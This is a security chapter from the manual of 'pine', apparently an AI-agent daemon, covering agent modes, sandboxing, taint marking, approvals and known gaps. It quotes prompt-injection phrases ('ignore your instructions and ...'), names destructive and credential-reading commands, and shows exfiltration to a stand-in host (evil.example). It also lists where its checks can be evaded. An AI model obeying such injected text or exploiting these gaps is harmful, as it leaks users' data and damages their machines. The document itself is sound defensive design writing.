# Security and its limits

pine runs models that read what strangers wrote and that can run commands. This chapter says how
pine defends against that, which mode to give an agent, when you are asked, and what is not solved.

## What can go wrong

The threats: someone outside drives the daemon (a stranger messages your bot, a web page posts to
the control port, someone calls a webhook); prompt injection, where a mail, page or file name says
"ignore your instructions and ..."; an agent, misled or mistaken, damages the machine (`rm -rf ~`,
reading SSH keys); information leaves; or the agent takes over the daemon by writing an extension
or its own configuration.

No model reliably tells instructions from data, so pine does not count on the model to refuse. It
limits what a run can do, by where its input came from and by the agent's mode.

## Modes: how much an agent does without asking

Each agent has a mode. It decides both whether there is a sandbox and what you are asked.

| Mode | Sandbox | What asks you |
|---|---|---|
| `auto` (the main agent's default) | Off: your whole account and the network | Critical actions, your `approve` list, sending out after outside content ("What asks you") |
| `safe` (the default for other agents) | On: the agent's own folders. pine asks you before a call reaches further | As `auto`, plus changes to its own memory or instructions after outside content |
| `manual` | On, where the machine has one | Every action that changes or sends something, unless you answered "always" for it here |
| `bypass` | Off | Nothing |
| `plan` | As in the mode before | Nothing: whatever does more than look is refused ("Plan mode") |

A run started by an event from outside (a webhook, a stranger's message, a source's report) always
works in the sandbox ("2. Where content came from decides what it may do").

Per action ("after outside content": once the conversation has read a web page, someone else's
message or other outside content):

| Action | `bypass` | `auto` | `safe` | `manual` | `plan` |
|---|---|---|---|---|---|
| `ls`, `cat`, `git status`, reading files, web search and reading pages | runs | runs | runs | runs | runs |
| Writing in its own workspace (its `MEMORY.md` and instruction files too); sending an event, an MQTT or Slack message or a task; a Telegram message to you, also after outside content; starting sub-agents | runs | runs | runs | asks | refused |
| `npm install`, `git commit`, editing a project file in your home | runs | runs | asks once for that folder | asks | refused |
| `curl`, `git push`, anything that needs the network from the shell | runs | runs | asks once for the network | asks | refused |
| `sudo`, a force push, `git reset --hard`, `curl ... \| sh`, shell startup files, ssh keys | runs | asks | asks | asks | refused |
| A tool on the agent's `approve` list | runs | asks | asks | asks | asks if it only looks, else refused |
| Sending something out (not to you) after outside content | asks (bypass is paused) | asks | asks | asks | refused |
| Its own `MEMORY.md`, `AGENTS.md`, `SOUL.md`, `TOOLS.md` after outside content | runs | runs | asks once per conversation | asks | refused |
| `CLAUDE.md`, `.pi/`, `.agents/`, a git hook or repository configuration after outside content | file tools refuse, the shell runs | file tools refuse, the shell runs (asks if it names a hook or the configuration) | refused | refused | refused |
| An address on this computer or your network in the browser | runs | asks once per address | asks once per address | asks once per address | refused |
| Operating your apps (`computer` server) | runs | asks once per app | not available | not available | looking runs (after your yes), acting refused |

A yes to a browser address ([mcp.md](mcp.md), "Local addresses") or an app
([computer.md](computer.md)) holds in that conversation. An address you type into the Pine app's
browser yourself needs none. pine's control port stays closed.

**Setting the mode.** In `agent.json` (`{ "mode": "manual" }`), for all agents with
`defaults.mode` in `pine.json`, or while pine runs with `/mode` or `shift+tab` in the terminal UI or
`pine mode <agent> <mode>`. `auto`, `safe` and `manual` are saved in `agent.json`. `bypass` and
`plan` last until pine restarts.

**Sub-agents** share their conversation's permissions: granted access, "always" answers, its folder
and its outside-content mark. A sub-agent never asks you. It is refused instead and says what it
needed, and its conversation can ask. A *delegated* task runs with the other agent's permissions,
held to the caller's mode where that is stricter ([agents.md](agents.md), "Handing work to another
agent").

**Bypass is paused after outside content**, since bypass plus a hostile page is your whole account.
The conversation works as in `auto` until it is reset. The terminal UI shows "bypass (paused)", and
the agent is told. To keep bypass, answer "bypass in this one anyway" when you choose bypass in
such a conversation (until a reset or a mode change), or set
`"security": { "bypassWhenTainted": true }` (named by `pine check`). Shell commands there then pass
the guards on instruction files and git settings. The file tools still refuse.

### Plan mode

Only calls that look run. The rest is refused without a question:

| In plan mode | Examples |
|---|---|
| Runs | `read`, `grep`, `find`, `ls`; shell commands that only read (`ls`, `cat`, `git status`, `git diff`); web search and page reading; read-only MCP tools; `manual`, `state_get`, `sources`, `schedules`, `mcp_servers`, `skills`; `question`, `todo`; the conversation's own board (`board_read`, and `board_post`, `board_claim`, `board_done`, `board_answer` without a board's name); `stop_program`; looking at an app (after your yes) |
| Refused | `write`, `edit`, every other shell command (a redirect such as `> file` and every command in the background included), `download`, `send`, `publish_event`, `state_set`, board tools with a board's name, `board_remove`, `delegate`, `subagent`, `request_access`, the setup tools (`add_...`, `remove_...`, `subscribe`), MCP tools not declared read-only (opening a page in the browser, a `commands` server's tools), acting in an app |

The agent answers with a plan and is told when you switch plan mode off. A run started from outside
is held to it too. Plan mode is no security boundary: a shell command counts as looking by its
name, an MCP tool by its server's word, and the sandbox is the previous mode's.

### The whole account

Real work needs what you have at your terminal: your projects in your home folder, your toolchains,
git and ssh setup, the network, and the right to stop a server the agent started. In `auto` mode
commands run without a sandbox, so the agent has all of that without asking:

| | |
|---|---|
| Files | Everything your user account can open and change |
| Closed | pine's home (configuration, `.env`, the token, database, other agents' folders) except the agent's own folders, and changing pine's program files. Kept by reading commands (below) |
| Network, processes, apps | As you: install packages, start and stop programs (`ps`, `kill`, `sudo`), open a browser |
| Environment | Yours, `$HOME` your home, without variables named like credentials (`KEY`, `TOKEN`, `SECRET`, `PASSWORD`, `AUTH`, ...) but with the ssh agent's address. Add more with `sandbox.env` |

`bypass` has the same reach and asks nothing. To keep an agent inside its folders, use `safe`.

#### pine's own files without a sandbox

In `auto` and `bypass`, pine reads what is about to run:

| What | Result |
|---|---|
| A file tool on a path in pine's home, or writing in pine's program | Refused by the daemon |
| A shell command naming a path in pine's home (written out, with `~`, `$HOME`, or `..` from the start folder) | Not run, except reading the files its event sources received |
| A shell command that plainly writes into pine's program (redirect, `touch`, `rm`, `cp`), starts `pine`, or names pine's control port | Not run |
| Any other shell command that names pine's program files and does more than look | Critical: you are asked (not in `bypass`) |

This is a net with holes: it does not see what a script or variable holds, and does not follow
`grep -r secret ~` into pine's home. Whoever holds the token in `data/http-token` can answer
approvals and change modes. For an agent that must not depend on it, use `safe`.

### What no mode opens

- pine's home (configuration, `.env`, credentials, database, other agents' folders). Agents never
  write there. They change the setup only through tools that check their input, write one entry,
  and ask you where [setup.md](setup.md), "What you are asked", says. After outside content most of
  the main agent's changes are refused.
- Writing pine's program files.
- More for a run started from outside: it keeps its `untrusted` profile.

## What asks you

No model judges what an agent does. In `auto` and `safe` mode an agent works without asking,
except:

| The action | Examples | When you are asked |
|---|---|---|
| is critical | writing shell startup files, ssh keys, git hooks or repository configuration, launch agents; a force push, `git reset --hard`, `git clean -f`, `curl ... \| sh`, `sudo`, deleting or `chmod -R` on a home folder, installing something that starts by itself (`crontab`, `launchctl load`, `systemctl enable`) | In every conversation |
| sends something out | what `approveWhenTainted` names (default `publish_event` and `send`, except a `send` that reaches only you), acting tools of MCP servers marked `"approve": "tainted"`, a task for another agent (its answer can carry its files back), `subscribe` | After outside content |
| changes the agent's own memory or instructions (`safe` only) | its `MEMORY.md`, `AGENTS.md`, `SOUL.md`, `TOOLS.md`; for the main agent also `AGENTS.md`, `TOOLS.md`, `USER.md` in pine's home | After outside content, once per conversation |
| is on the agent's `approve` list | `"approve": ["bash:*git push*", "send:house", "mcp__calendar__delete_*"]` in `agent.json`; an MCP server with `"approve": "always"` | Every time, in every mode but `bypass` |

Everything else runs, also after outside content: shell commands, files in reach, downloads, a
message to you.

**Telling you is never asked about.** A `send` through a source that reaches only you (Telegram,
which writes only to your chat) goes out at once, since a watching agent has read outside content
by the time it has news. To see each first, add it to the `approve` list
(`"approve": ["send:telegram"]`, with the source's name).

Critical actions are found by a fixed list of patterns, which a script or variable can get past.
After outside content nothing checks an ordinary shell command: in `auto` a page can talk the agent
into `curl`-ing your files somewhere. An agent that reads the web belongs in `safe`, whose shell
has no network until you grant it.

How an approval reaches you and its three answers: "4. Taint and approvals".

### When a call needs something outside: pine asks you

An agent in the sandbox (`safe`, `manual`) need not know where it ends. When a call needs a file or
folder of yours, or the network, pine asks you itself, although the agent never asked, with an
approval named `request_access`:

| When | What happens |
|---|---|
| A file tool gets a path outside the agent's folders | You are asked before the call. A no is told to the agent |
| A shell command names such a path (`cat /Users/you/notes/a.txt`, a redirect, `cp` to one) | You are asked before it runs: for reading a path that exists, for writing what a redirect, `touch`, `mkdir`, `rm`, `mv`, `tee`, `cp` and the like name |
| A command writes `~` or `$HOME` for your home | `~` there is the agent's private home (`sandbox/<id>/`). You are asked for your path, and the agent is told to write it out |
| A command is refused something it did not name (a script opens a file, a program wants the network) | macOS: pine reads the system's reports of the refusal, asks you, and adds what was refused and your answer to the output, so the agent can run it again after a yes |

A yes holds for the conversation and its sub-agents until a reset or a restart, and so does a no.
The agent can also call `request_access` itself. pine's home, pine's code and other agents'
workspaces are never asked about: no answer opens them. What a program looks for by itself (dot
files, `Library`) is asked about only when the command names it, the network only after a command
failed without it, and a run from outside never. After outside content the question begins
"Careful: ...". On Linux pine goes by the paths a command names and the words of a failed command
("Operation not permitted", "Could not resolve host").

To turn the question off, set `security.askAccess` to `false` (Settings > Security, "Ask when an
agent needs more"). Then only the agent's own `request_access` asks.

### Its own memory and instructions after outside content

An agent's own files (`MEMORY.md`, `AGENTS.md`, `SOUL.md`, `TOOLS.md` in its workspace; for the main
agent also the files for all agents) are read into every later conversation without the
outside-content mark, so what a page talks it into writing there outlives a reset. In `safe` mode
an agent that has read a web page asks you once before it first changes them, for example to save
a note in its memory. Calls made side by side wait for the one question.

| Answer or case | What happens |
|---|---|
| Yes | It may change all of them until the conversation is reset, also after a restart. Undoing the message that brought the outside content in takes the yes back |
| No | Every later change is refused unasked, until a reset or a restart. Without an answer the next change asks again |
| A shell command that names the file (`echo ... \| tee -a MEMORY.md`) | The same question first. One that writes it without naming it is refused, and the agent is told to use the write or edit tool |
| A sub-agent | Goes by the conversation's answer. Without a yes it is not allowed to change `MEMORY.md` or its instructions |
| A task handed to another agent | That agent asks about its own files, once for that task |

`plan` refuses the change. `auto` and `bypass` do not ask: without a sandbox a shell command could
write the files whatever you answered. A run started from outside writes none of them.

## The layers

### 1. Who may speak

| Channel | Who gets in |
|---|---|
| Telegram | Only the account you paired (with a code the bot sends, typed into pine) or the user ids in `allow`. Others get no answer and cause no question |
| Control API | Loopback by default. Every request but `GET /health` and webhooks needs the token in `data/http-token` (mode 600, read by the CLI). A request with an `Origin` or `Sec-Fetch-Site` header or an unexpected `Host` is refused, so web pages cannot use it, DNS rebinding included. JSON bodies up to 1 MB (64 MB with files) |
| Webhooks | A secret each (bearer or HMAC of the body) unless `"open": true`, 120 requests a minute, a fixed topic. Web pages are refused. `Host` is not checked, so a tunnel or reverse proxy works |
| MQTT, watched folders | You choose the topics and folders. What arrives is outside content |
| The Pine app on a phone or in a browser | Off until you turn on browser access; a device needs a key you allowed at this computer ([desktop.md](desktop.md), "What the app is careful about") |
| Event sources | You set them up or confirm them. One nobody is subscribed to does not run (unless `"start": "always"`). Its events are outside content unless you mark it as yours |

### 2. Where content came from decides what it may do

Every event carries `trust`. It is `owner` for an event from a channel that authenticated you (a
paired or listed Telegram account, the control API), a schedule, a source marked
`"trust": "owner"`, or `publish_event` in a conversation that has read no outside content. All
else is `untrusted`.

A task started by an untrusted event (a webhook, a stranger's message) runs with the agent's
`untrusted` profile:

- built-in tools `read`, `grep`, `find`, `ls` only: no shell, no writing;
- no MCP servers, delegation, `publish_event`, state writes, sub-agents or board;
- no setup tools or tools that turn to you (`add_source`, `add_mcp_server`, `add_skill`,
  `add_schedule`, `subscribe`, `request_access`, `question`), and no `todo`, `manual` or `download`;
- no command in the background, goal, app control or browser window on your screen;
- the sandbox, whatever the mode;
- its own session (`<name>~u`), which neither sees nor writes your conversation.

The missing tools are not registered in such a run at all. You can widen the first two lines per
agent (`"untrusted": { "tools": [...], "mcp": [...], "delegates": [...], "publish": [...],
"stateWrite": true, "subagents": true, "board": true }`), or refuse untrusted tasks
(`"untrusted": false`). What such a run hands on stays untrusted. It is never asked about more
access, since nobody may be there. Your `approve` list, critical actions and sending out are still
put to you. `pine check` names every agent whose `untrusted` profile has `bash`, `write` or `edit`.

A route may declare its events trusted (`"trust": "owner"`). Do that only for a source nobody else
can write to. `pine check` lists every such route.

An event of a source that one of your conversations subscribed to starts no reduced run. It goes
into that conversation, framed as data, and taints it (layer 4). `"separate": true` on the
subscription gives the reduced run instead.

### 3. The sandbox

`safe` and `manual` run shell commands and file tools in the operating system's sandbox, `auto` and
`bypass` without, and a run started from outside always in it. It is `sandbox-exec` on macOS and
[bubblewrap](https://github.com/containers/bubblewrap) (`bwrap`) on Linux. Windows has no sandbox
of pine's, so `safe` mode there is pine in WSL.

| In the sandbox | On both systems |
|---|---|
| Can read | Its workspace, private home, skills, pine's manual (`docs/`), temp, the files its event sources received, the system outside your home folder |
| Can write | Its workspace, private home (`sandbox/<id>/`, its `$HOME`), temp. The main agent also `AGENTS.md`, `TOOLS.md`, `USER.md` in pine's home, nothing else there |
| Cannot read or write | Your home folder, pine's home, other agents' workspaces |
| Cannot | Use the network (unless `sandbox.network` or your grant), signal or inspect other processes, or reach your session's services: launching apps, AppleScript, keychain or keyring, clipboard, session bus, a container daemon, an ssh agent |
| Can compute on | macOS: the graphics chip and neural engine (a Swift script using Vision works). They reach no file, address or program |
| Environment | A few variables (`PATH`, `LANG`, ...), nothing from the daemon, no secrets. `HOME` is the private home |

The files event sources received (a camera's upload, a photo sent through Telegram) lie in
`data/sources/<name>/`. In every mode an agent reads those of its own sources and of sources it is
subscribed to, and writes none. The rest of pine's data stays closed ([sources.md](sources.md),
"Files a source received").

The file tools (`read`, `write`, `edit`, `grep`, `find`, `ls`) run inside the sandbox too, so the
operating system decides at access time and a link swapped in after a check gains nothing. Without
a sandbox a check in the daemon keeps pine's home and program closed, and after outside content
the files read as instructions.

A folder you open for a conversation is read and written by that conversation and its sub-agents,
not by a run that outside content started. Only you open one, never pine's home or program or
another agent's workspace. Its `AGENTS.md` and `CLAUDE.md` become instructions
([coding.md](coding.md)). The code pane runs nothing from it. Saving from an editor and file tree
changes go through a helper in a sandbox that may write only that folder, so a planted link is
never written through. Without a sandbox nothing is written that way.

What follows:

- An agent cannot change its `agent.json`, extensions or `pine.json`. Rules it must keep go into
  `agents/<id>/AGENTS.md`, out of its reach.
- Tools that need files in your home (`~/.gitconfig`, `~/.npmrc`, `~/.ssh`) see the empty private
  home. Grant folders with `sandbox.read` / `sandbox.write`, or use `auto`.
- Without a working sandbox (Linux without bubblewrap or user namespaces, a container without the
  rights, other systems) there is no `safe`. An agent whose mode nobody chose works in `auto`, one
  set to `safe` and runs started from outside get no shell, and `command` sources do not run.
  `pine check` says why.
- A local MCP server you added runs with your rights. One an agent added (`add_mcp_server`) runs
  where its commands run, and `"sandboxed": true` does that for yours ([mcp.md](mcp.md)).
- `trustWorkspace` stays `false`: nothing executable is loaded from the workspace.

#### Worktrees

A conversation in a worktree ([coding.md](coding.md), "A worktree for a conversation") writes its
worktree and, in the shared git folder, only the objects, its index and HEAD, and branches under
`pine/`. The repository's configuration and hooks, your branches, the main checkout and other
worktrees stay closed, by pine's record and never a file in the worktree. Still shared: it could
damage the objects and move any branch under `pine/`. pine's own git calls for it run with hooks
off and the repository's filters and merge drivers replaced.

#### On Linux

The sandbox needs bubblewrap, allowed to create user namespaces. `pine init` sets up both and the
browser's libraries, running the administrator commands it shows after one yes (`pine init --yes`
does not ask). `pine check` says why the sandbox does not work.

| Case | What happens |
|---|---|
| bubblewrap missing | Installed with apt, dnf, yum, pacman, zypper or apk |
| Ubuntu 24.04 and later | AppArmor restricts user namespaces. pine writes `/etc/apparmor.d/bwrap`, allowing them for bubblewrap alone, and loads it |
| A container (Docker, Podman) | Needs, with pine as root: `--cap-add SYS_ADMIN --cap-add NET_ADMIN --security-opt seccomp=unconfined --security-opt apparmor=unconfined`; as an ordinary user also `--security-opt systempaths=unconfined` (`--privileged` does all). `pine init` names what is missing |
| No `sudo` and not root | pine prints the commands for the administrator |
| The browser's libraries | Installed where apt is, elsewhere named. Web search works without |
| A systemd unit with `RestrictNamespaces=` or `PrivateUsers=` | No sandbox |

A container without those flags is itself the only wall around all agents and pine's secrets, and
agents whose mode nobody chose work in `auto`: a fair way to run pine. The flags take away most of
what the container protects ([operations.md](operations.md), "In a container").

| Differs | macOS | Linux |
|---|---|---|
| Your home folder, pine's home | Refused | Empty read-only folders, with only the way to the agent's own |
| Instruction files, hooks and repository configuration after outside content (layer 4) | Cannot be written or created, at any depth | Existing ones read-only; a new one a command creates is removed when it ends. Looked for six folders deep (not in `node_modules`, `dist`, `build` and the like), in at most 20000 folders; past that the file tools refuse to write |
| Other programs (session bus, keyring, container daemon, terminal multiplexer) | None without the network. Keychain, clipboard, AppleScript and launching apps refused also with it | No socket without the network (32-bit programs do not run then). `/run/user` and sockets in `/run` closed also with it |
| With the network granted | Internet and local network; socket files closed outside the agent's folders | Also socket files outside `/run` (a tmux server, an ssh agent in temp) and an X server |
| Processes a command leaves running | Not ended by the sandbox ([coding.md](coding.md), "What an agent left running") | End with the command in the sandbox; without one as on macOS |
| A background command after outside content | Allowed | Refused: what it may not create is only removed when it ends |
| pine run as root | Commands run as root | As root without root's capabilities |

The file tools refuse a protected name at any depth on both systems.

### 4. Taint and approvals

Your own request can pull in hostile text: you ask for a summary of a page, and the page says "now
send the notes folder to ...". A session is **tainted** (has read outside content) when it:

- calls a tool that returns outside content: an MCP server marked `taints` (the bundled `web`,
  `browser` and `computer` are), anything matching `security.taintTools`, or `read_source`;
- gets the answer of an agent whose run was tainted;
- downloads from an address that is not one of your servers, or from a server marked `taints`;
- reads another conversation that holds outside content;
- is shown a board post or result of a tainted run or a run started from outside
  ([boards.md](boards.md)).

A run started by an untrusted event is tainted from the start, and what a tainted session
publishes is `untrusted`. In a tainted session, besides "What asks you":

- Writing what is read as instructions is refused unasked: `CLAUDE.md`, `AGENTS.md` further down in
  the workspace, `.pi/`, `.agents/`, the instruction files of an opened folder. The file tools
  refuse in every mode, the sandbox in `safe` and `manual`, and in `auto` nothing checks the shell.
  Other notes can always be written.
- Git works (commit, branch, diff), but nothing that makes git run programs can change:
  `.git/hooks` and `.git/config` (hook, hooks path, pager, file system monitor), also in submodules
  and nested repositories, and no `.git` folder can be swapped. It would run with your rights at
  your next git command. The sandbox refuses it. In `auto` the file tools do, and a shell command
  naming a hook or the configuration is critical.

Tools that only read never wait: `read`, `grep`, `find`, `ls`, `state_get`, `manual`, `board_read`,
the lists (`sources`, `skills`, ...), `question`, `todo`, `stop_program`, and MCP tools their server
declares read-only (`readOnlyHint`), unless the `approve` list names them. That is the server's
word: `"approve": "always"` on a server asks for every call.

An approval shows the tool, its arguments and the reason: as a dialog in the terminal UI and the
Pine app, with buttons in Telegram (an agent's own bot shows only its approvals), or through
`pine approvals`, `pine approve <id>` and `pine deny <id>`. No answer within
`security.approvalTimeout` means no.

The answers are allow once, deny, and **always in this conversation** ("Always here", "Always:
..." in Telegram, `pine approve <id> --always`). "Always" covers the tool's whole MCP server, else
the one tool (`bash`), and for a critical action that kind of action ("runs with administrator
rights"), until a reset or a restart. It is not offered for what you set to ask every time (the
`approve` list, `"approve": "always"`). A yes from before the conversation read outside content is
asked again.

`security.taint` sets how long the mark lasts: `session` (default) until a reset (`/reset`,
`pine reset`), since the text is still in the context; `run` until the task ends (weaker); `off`
never. Runs started from outside stay restricted either way. Taking back the message that brought
the outside content in clears the mark ([coding.md](coding.md), "Taking a message back"). A branch
([agents.md](agents.md#branching-a-conversation)) starts with the mark at that point, without what
you allowed the original.

## Other ways in and out

### Downloads

`download` fetches a file into the workspace byte for byte, with its size and SHA-256, also where
the shell has no network, and puts it in place through the sandbox. `limits.maxDownloadMb` (200)
caps it. A run started from outside does not have it.

- An address on the origin (scheme, host, port) of one of the agent's remote MCP servers is fetched
  unasked. A redirect elsewhere is not followed under this rule.
- A server's `headers` (its key) go only with an address that server's tools returned in the same
  conversation, exactly as returned: never to an address the agent made up, along a redirect, or
  for a server marked `taints`. The key stays out of the conversation.
- With the bundled `web` or `browser` server, any public https address is fetched unasked, also
  after outside content. `allowHosts`, `denyHosts` and `allowPrivate` of the `web` server apply
  while the conversation has no network of its own.
- Otherwise the conversation needs network access (`sandbox.network`, a grant, or `auto`/`bypass`)
  and gets only public https addresses. Without it the download is refused unasked.
- A file from an address that is not one of your servers, or from a server marked `taints`, taints
  the session.

### Pictures and links in an answer

- A picture at a web address loads only on your click, so `![](https://somewhere/?q=<your notes>)`
  sends nothing when shown. The UIs show where a link goes.
- The path of a workspace picture comes from the model, so the control API serves only image, video
  and sound files (checked by content) that really lie in the workspace or the conversation's
  folder, not through a link. All picture routes need the token.
- Media are decoded without network and without write access outside temp. "Open in player" hands a
  file to the system's player only on your click.
- Pictures a tool returned are kept in `data/media/tool` (mode 600) as long as the event log
  (`limits.eventRetentionDays`).

### Event sources

A subscription lets a source start an agent turn without you ([sources.md](sources.md), "Trust").
What keeps that safe:

- Events are outside content unless the source is marked `"trust": "owner"`. They taint the
  subscribed conversation, so sending out asks you and bypass pauses. `"separate": true` starts a
  reduced run instead (layer 2), the stronger protection for strangers' text.
- An agent sets up a source (`add_source`) only in a conversation with you, and you confirm what
  opens something new: a folder outside its workspace, a connection, a port, a source for all
  agents, a trusted source. The model never sees a secret pine makes. Secrets stay in `.env`, out
  of events and logs.
- A reduced run has no `subscribe`, and after outside content it asks you, so a page cannot make an
  agent listen. An unsubscribed source does not run: no port, no connection.
- A type that listens on a port (`ftp`, `smtp`, `syslog`, `webhook`) only receives. It needs a
  password, secret or list of client addresses, or the dialog and `pine check` say anyone on the
  network can write to it.
- A type that connects out reaches only the address you confirmed: no public name that later leads
  into your network, no redirect to another host, a token only to its host.
- `mail`, `smtp`, `slack`, `matrix`, `discord` and `zulip` report outside content whoever a message
  claims to be from. Do not give them `"trust": "owner"`. `pine check` names every source that has
  it.
- A source that can send (`mail`, `slack`, `matrix`, `discord`, `zulip`, `mqtt`) sends only to the
  addresses, channels or topics on its own list, checked by the type.
- `read_source` (earlier messages of a Slack channel) reads only where the source listens. A run
  from outside does not have it.
- A `command` source runs in its agent's sandbox whatever the mode: its folders, no network, not
  your environment, instruction files read-only. You see the command line first. Without a sandbox
  it does not run, and `follow` is refused on Linux.
- `http` with `render` uses pine's browser behind the browser tools' guard, without tools, cookies
  or token. The page's scripts run, which the dialog says. The `system` type starts a helper pine
  built, and no option names a program.
- A status line is read without the outside-content mark, so it repeats a found value only when it
  is a number or a single word.
- A subscription has a throttle (10 s by default), so a chatty device cannot keep a model busy.

Each type's own limits are in [source-types.md](source-types.md).

### A new kind of source is a program

A source type runs inside pine with pine's rights, outside any sandbox. You add one
(`sourceTypes` in `pine.json`, or `"use"` on a source), or the main agent does with
`add_source_type`, only in a conversation with you that has read no outside content. It asks you
every time, in every mode, in a dialog naming it a program with its size, imports and file. pine
runs the copy it took into its home at that moment, so what you confirmed is what runs. Read the
file before you confirm. `pine check` lists every registered type and every source with `"use"`.

### Skills are instructions

A skill is read into an agent's prompt, so it is guarded like the instruction files. Skills lie in
pine's home, which agents read and never write. Only `add_skill` writes them. You see a skill's
instructions before it is added after outside content (any scope), for all agents (main agent
only), when an agent adds one for itself from a side conversation, and in manual mode. A link in a
skill's folder is refused. Its scripts run like anything the agent runs ([agents.md](agents.md),
"Skills").

### Outputs check for themselves

Whatever was approved, the Telegram source sends only to your chat, and the MQTT source only to
its `publish` topics. An agent's `publish` list names the topics it may use at all. No agent
publishes on pine's own topics (`agent/`, `approval/`, `board/`, `pine/`, `state/`, `timer/`).

### Secrets

Secrets live in `.env` and are filled into the configuration, never into pine's environment, so
child processes do not inherit them. Known values (every `.env` value of eight characters or more,
bot tokens, the control token) become `[redacted]` in events, outgoing messages and logs. A tool
that needs a secret leaves it out, and you type it into pine's dialog, so no model sees it. A
secret you write into a conversation is redacted from then on, but the model has seen it. Change
it if the model is not yours ([configuration.md](configuration.md), "Secrets"). `pine check`
reports configuration files and a home that other users can read.

### Limits against runaway behaviour

Delegation depth and loops, event hops, queue length, task and shell time, prompt size for
untrusted events and goal or swarm rounds are limited ([configuration.md](configuration.md)). Each
webhook takes 120 requests a minute.

## Work that goes on in your name

Some work calls an agent again without a message from you. Only you start it, and a run from
outside has none of it.

### Schedules act in your name

What a schedule starts counts as your wish: usual tools, nothing marked. So an agent adds one
unasked only for its own conversation, or for itself from its main conversation, and not in manual mode.
For itself from a side conversation, or for all agents (main agent only), you are asked. After
outside content you are always asked and see the task, so a sentence on a page cannot become an
hourly job. They are entries in pine's configuration, which agents cannot write ([events.md](events.md),
"Schedules").

### A goal goes on in your name

`/goal` calls an agent again until an objective is met ([agents.md](agents.md), "Goal mode"). Only
you set, pause, resume or clear it, and no tool reaches it. Each new round gets your objective in
fixed text of pine's, never the agent's answer or the judge's reason, which could repeat a web page
in your voice. The judge says one of three words: a wrong "met" or "blocked" stops the work, a
wrong "continue" costs rounds (at most `limits.goalRounds`), and no verdict pauses. Rounds work
under the mode and approvals. Your own message, `esc`, a failed round or a restart pauses the goal.

### A swarm goes on in your name

With `/swarm` a lead agent is called again while tasks on the conversation's board are not done
([boards.md](boards.md), "A swarm"). Only you start, pause, resume or clear one, and no tool reaches
it. The lead is called with your job and fixed text with task counts, never a word of an answer or
a check, which it reads from the board. The board decides when it is done, not a model. It stops
after `limits.swarmRounds` turns and waits for you after a restart. Every turn and sub-agent works
under the conversation's mode and approvals.

### Commands in the background

A `background: true` command ([coding.md](coding.md), "Commands in the background") runs in the
same sandbox as other commands, so running on gains nothing. Only your own conversations start one
(at most eight at a time), on Linux not after outside content. pine finds what runs by itself,
stops only what the conversation's commands started, and reports the end in a message of its own
with the output quoted, never as your words.

### Undo is yours

`/undo` takes back your last message with the files it changed ([coding.md](coding.md), "Taking a
message back"). Only you undo, only a message you typed, never a run outside content started.
Folder states are kept in `data/snapshots`, which no agent can write, and restored without running
anything from the folder and never through a link. The outside-content mark and what you allowed go
back to before the message, never to more. What left the machine (a message, a push) stays gone.

## A layout that keeps the pieces apart

The example home has one agent, `main`, with the web tools and your account. The danger is one agent that has private data,
reads outside content and can send things out. Once agents hold private data, split those:

| Agent | Has | Does not have |
|---|---|---|
| `main` | Your conversation, your account, delegation to everyone | Web tools |
| `scout` | Web search and page reading, `safe` mode | Anything private: empty workspace, no delegation (`"delegates": []`), no state |
| Specialists (`gonzo`, `house`) | Their repository, their own MCP servers | Web tools, network |
| `house` | Camera and sensor events (untrusted profile), writes `house/` state | A shell, the network |

Scout's answer taints `main`'s conversation, so `main` then needs your yes to send out or hand on a
task. Scout can be fooled but has nothing to give away, as long as it has `"delegates": []`. By
default every agent can ask the others for their files.

## What is not solved

| Problem | What it means and what helps |
|---|---|
| Leaks through an allowed channel | A page can make an agent with private files and web access fetch `https://evil.example/?q=<your data>`. The layout above avoids it |
| The modes without a sandbox | `auto` and `bypass` keep pine's home closed only by reading commands, and after outside content their shell can write instruction files and git hooks ("pine's own files without a sandbox"). Put an agent that reads the web in `safe`. Use `bypass` only for a watched task on an agent that does not |
| Memory after outside content | In `auto` and `bypass` an agent writes its own instruction files and `MEMORY.md` unchecked (the main agent also those every agent reads), and in `safe` nothing checks what it writes after your yes. Other agents read the first paragraph of its `AGENTS.md`. Look into these files now and then. Rules that must hold go into `agents/<id>/AGENTS.md` |
| A model server reads what it is sent | Its operator sees the conversations, and over plain `http` anyone on the path. Use `https` beyond your own network |
| Worktrees without a sandbox | Kept apart only by where their tools start |
| Bad answers and approval fatigue | An injected page can make an agent tell you something false, and an approval shows the action, not honest reasoning. Approving without reading makes the questions worthless |
| Your own MCP servers, extensions and source types | They run unsandboxed: a server that can delete mail does so when asked. Mark it `"approve": "tainted"` or `"always"`. An extension runs inside pine itself and can read everything pine reads, your keys included: nobody at pine has read the ones you install ([extensions.md](extensions.md)) |
| Shell with network | `sandbox.network: true` reaches the internet and your local network, an unauthenticated model server and any port on this machine, and on Linux socket files in temp. Prefer the `web` server or a `commands` tool |
| App control is outside the sandbox | What an app can open, the agent can: a terminal or the Finder reaches pine's home, a mail app sends as you. Allow such apps only for a watched task |
| A signed-in browser | With a persistent `profile`, or after you log in in a window the agent opened or the Pine app's browser, the agent acts as you on that site ([mcp.md](mcp.md)) |
| The sandbox is the operating system's | A kernel or sandbox bug is a way out. For more, run the daemon as a separate user with no access to your files |
| Linux | A new instruction file exists until its command ends, and is looked for only six folders deep ("On Linux") |
| Local users | An account that can read pine's home has everything. Keep it at mode 700 |
| Model quality | A small quantised model follows hostile text more readily |

## Checklist

1. `pine check` shows "No security notes", or you know why each note is there.
2. Every webhook has a secret, and no source's reports count as yours unless they should (`pine check` names both; a paired Telegram account is not listed).
3. `.env`, `pine.json`, `models.json` and `auth.json` are mode 600, the home 700 (`pine check` reports these).
4. No agent has `"trustWorkspace": true` or `"mode": "bypass"`, and every agent in `auto` should have your whole account.
5. Web and browser tools are on a `safe` agent whose workspace holds nothing private, or you accept that in `auto` nothing checks the shell after it read the web.
6. MCP servers that return other people's text have `"taints": true`; those that change things have `"approve": "tainted"`.
7. No route sets `"trust": "owner"` for a source others can write to.
8. `http.host` is `127.0.0.1`; remote access goes through SSH or a tunnel.
9. Approvals reach you: give an agent `"approve": ["bash:*"]` once and ask it to run `ls` (not in bypass).
